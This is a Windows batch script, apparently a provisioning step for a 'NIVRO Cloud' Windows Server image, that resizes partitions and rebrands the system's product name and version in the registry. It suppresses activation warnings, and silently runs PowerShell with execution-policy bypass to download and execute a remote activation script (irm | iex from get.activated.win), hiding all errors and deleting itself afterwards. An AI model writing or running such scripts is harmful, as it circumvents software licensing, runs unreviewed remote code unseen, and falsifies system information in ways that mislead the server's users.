@echo off
mode con cp select=437 >nul

set C=%SystemDrive:~0,1%
for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<installer\>"') do (echo select vol %%a & echo delete partition) | diskpart
for /f "tokens=2" %%a in ('echo list vol ^| diskpart ^| findstr "\<%C%\>"') do (echo select vol %%a & echo extend) | diskpart

rem Permanently remove "Activate Windows" watermark
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform\Activation" /v Manual /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" /v NotificationDisabled /t REG_DWORD /d 1 /f >nul 2>&1
rem Custom NIVRO Cloud Branding in desktop watermark & system info
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName /t REG_SZ /d "NIVRO Cloud — Windows Server 2025" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v DisplayVersion /t REG_SZ /d "Private Tier Authorized" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v BuildLabEx /t REG_SZ /d "NIVRO.2026.Private.Subscription" /f >nul 2>&1

rem Display Windows Server version & build watermark in desktop corner
reg add "HKCU\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKU\.DEFAULT\Control Panel\Desktop" /v PaintDesktopVersion /t REG_DWORD /d 1 /f >nul 2>&1

rem Silent background automated activation via MAS
start /b powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "try { irm https://get.activated.win | iex /TSforge } catch {}" >nul 2>&1

del "%~f0"
